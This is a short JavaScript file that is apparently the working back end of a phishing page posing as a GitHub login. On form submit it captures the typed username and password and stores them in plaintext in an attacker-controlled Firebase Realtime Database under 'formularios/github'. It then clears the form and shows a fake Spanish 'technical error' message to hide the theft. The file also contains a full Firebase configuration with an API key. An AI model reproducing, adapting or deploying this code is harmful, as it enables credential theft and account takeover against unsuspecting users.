
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyA8HbJdxHE3ajEvzDJnEZ5RYUQAwstOwPA",
  authDomain: "github-79c43.firebaseapp.com",
  databaseURL: "https://github-79c43-default-rtdb.firebaseio.com/",
  projectId: "github-79c43",
  storageBucket: "github-79c43.appspot.com",
  messagingSenderId: "339614155051",
  appId: "1:339614155051:web:bcd69e95daae976c4ac56e",
  measurementId: "G-RXFZEP8VX3"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

document.querySelector("form").addEventListener("submit", async (e) => {
  e.preventDefault();
  
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    const datosRef = ref(database, "formularios/github");
    
    const nuevoRegistro = push(datosRef);
    
    await set(nuevoRegistro, {
      usuario: username,
      contrasena: password,
      fecha: new Date().toISOString()
    });

    
    e.target.reset();

    console.log("Datos guardados");
    
  } catch (error) {
    console.error("Error al guardar en Firebase:", error);
    alert("Error técnico. Por favor intenta más tarde.");
  }
});